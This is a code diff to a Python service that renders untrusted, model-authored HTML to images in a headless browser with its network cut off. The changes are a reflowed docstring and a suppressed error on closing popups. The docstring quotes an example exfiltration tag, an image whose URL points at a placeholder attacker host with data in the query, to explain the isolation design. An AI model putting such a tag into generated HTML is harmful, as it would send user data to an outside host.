@@ -11,9 +11,10 @@ PWA only ever receives an image. Pixels cannot execute.
 
 **The network is off, twice.** The compose service sits on a Docker network declared
 `internal: true`, so the container has no route off the box at all, and every request
-the page (or a popup it opens, which is closed) attempts is aborted here as well. Model-authored HTML is untrusted input; a
-`<img src="http://attacker/?data=...">` is the obvious exfiltration primitive and
-neither layer alone is a guarantee worth betting owner data on.
+the page (or a popup it opens, which is closed) attempts is aborted here as well.
+Model-authored HTML is untrusted input; a `<img src="http://attacker/?data=...">` is the
+obvious exfiltration primitive and neither layer alone is a guarantee worth betting
+owner data on.
 
 **It never sees owner images.** Callers render a TRANSPARENT overlay and composite it
 over the photograph themselves, back inside the domain firewall. So a health-scoped
@@ -39,6 +40,7 @@ from __future__ import annotations
 
 import asyncio
 import base64
+import contextlib
 import os
 import re
 import struct
@@ -241,8 +243,11 @@ async def render(body: RenderRequest) -> RenderResponse:
 
         async def _close_popup(opened: object) -> None:
             # Nothing a render needs lives in a second page; close it so it can't run on.
+            # Suppressed: a popup that lands after the context closed fails its own close,
+            # and an unretrieved error in this fire-and-forget handler would only be noise.
             if opened is not page:
-                await opened.close()  # type: ignore[attr-defined]
+                with contextlib.suppress(Exception):
+                    await opened.close()  # type: ignore[attr-defined]
 
         context.on("page", _close_popup)
         await page.set_content(_document(body), wait_until="load", timeout=RENDER_TIMEOUT_MS)
